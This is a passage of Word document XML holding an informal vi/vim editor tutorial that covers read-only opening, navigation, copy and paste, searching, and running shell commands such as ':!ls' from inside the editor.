        </w:rPr>
        <w:t>VI commands</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> I have learned so far and using regularly. Idea is to keep this </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VI Editor tutorial</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> updated with every single useful VI commands I learn and I also ask you guys to contribute with something useful. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:bookmarkStart w:id="1" w:name="more"/>
      <w:bookmarkEnd w:id="1"/>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t>If you see 10 people's working in VI editor you realize that they use it differently then use some new VI commands which you are not familiar of and which could improve your productivity as well. So if you would like to know more and more about VI editor I would suggest observing people around you when they work in VIM or VI editor and learn from their experience. </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t xml:space="preserve">Don’t confuse with both VIM and VI, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VIM stands for VI improved</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and has some more feature than VI editor. Many times you will find that VI command is aliased to VIM to make it default editor in UNIX.</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t>Long story short let get into VI command examples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B54D25A" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1016B3A5" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Opening file in Read only mode in VI Editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F67876" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>If you are in production server then you definitely want to open a config file in read only mode to avoid any accidental change. So if you are not using less you can use "-R" option of VI editor:</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t>vim -R config.xml</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t>And if you want to save any change from read only mode you can do by ":</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!".</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7778378E" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Navigation commands in Vim or VI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F849FB" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">One secret of being efficient in VI editor is to be fluent in navigating between different parts of file. Any time you should be able to go to start of file, end of file, start of line, end of line, and search for a particular word from up and down and then move around. Navigational commands are executed from inside </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>VI editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, here are some of must know examples:</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t>gg -- goes to start of file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>shift g -- goes to end of file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>0 -- goes to beginning of the line</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>$ -- goes to end of the line</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- goes to nth line</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">:n -- another way of going to nth line </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="253B04B7" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Editing in VI Editor in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6430B4D9" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">What do we do most in </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>VI editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> I would say editing and to become efficient and quick this is an area where you need to practice and become fluent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B96D6E7" w14:textId="2B2452ED" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24BF2F3D" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>yy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- equivalent to cut also called yank</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>p -- paste below line</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>shift p -- paste above line</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>dd -- deletes the current line</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>5dd -- deletes 5 lines</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>u -- undo last change</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Ctrl + R - Re do last change </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55841066" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Searching pattern in VI Editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4675FFB5" w14:textId="659F4B9A" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37DF96C0" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Most of you guys familiar with </w:t>
      </w:r>
      <w:hyperlink r:id="rId63" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">grep command in UNIX </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:hyperlink r:id="rId64" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>UNIX find command</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is used for searching in Unix, here we will see how to search inside VI. If you have open your log file in </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>VI editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and looking for any word you can search for a particular word or ID from either top to bottom or bottom to top, if you are interested in first occurrence then I would suggest to search from top to bottom on the other hand if you are interested on last occurrence then </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> better to search from bottom to top</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r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/Exception </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- will search for word "Exception" from top to bottom and stop when it got first match, to go to next match type  "n" and for coming back to previous match press "Shift + N"</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r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?Exception</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>  -- will search for word "Exception" from bottom to top and stop when it got first match, to go to next match type  "n" and for coming back to previous match press "Shift + N", remember for next match it will go towards top of file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A70EFB" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Running Shell command from inside VI Editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF674BE" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Some times</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> we are editing something and we wanted to execute some shell command to get some information, normally we need to close the VI editor then execute shell command and then again open the VI editor this is not a </w:t>
      </w:r>
      <w:hyperlink r:id="rId65" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fast way of doing it,</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> if we want to save time and work faster we need to directly execute shell command from VI and we can do this by using </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"!command"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from command mode of VI editor. For example doing “ls” from VI editor we can type:</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t>:!ls</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t xml:space="preserve">if you wants to go directly to shell </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
